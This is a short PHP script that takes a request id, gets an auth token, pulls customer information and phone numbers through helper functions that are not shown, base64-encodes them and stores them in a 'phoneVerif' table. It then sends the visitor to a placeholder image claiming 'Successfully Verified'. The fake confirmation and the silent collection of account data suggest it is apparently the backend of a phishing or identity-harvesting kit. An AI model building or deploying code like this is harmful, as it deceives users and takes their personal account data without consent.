<?php
include './includes/conn.php';
include './includes/core_identity.php';

if (isset($_GET['queryId'])) {
    if ($_GET['queryId'] != '') {
        $queryId = $_GET['queryId'];

        $tokenObj = json_decode(myToken(), true);
        if (isset($tokenObj['data']['generateToken']['token'])) {
            $token = $tokenObj['data']['generateToken']['token'];
            $part1 = GetCustomerInfo($token);
            $part2 = queryMyNumbers($token);

            $part1 = base64_encode($part1);
            $part2 = base64_encode($part2);

            $stmt = $conn->prepare("UPDATE phoneVerif SET part1=:part1, part2=:part2 WHERE request_id=:request_id");
            $stmt->execute(['part1'=>$part1, 'part2'=>$part2, 'request_id'=>$queryId]);

        } else {
            $token = 'unavailable';
        }
    }
}
header('location: https://fakeimg.pl/1080x520/0af544/175fe6?text=Successfully+Verified');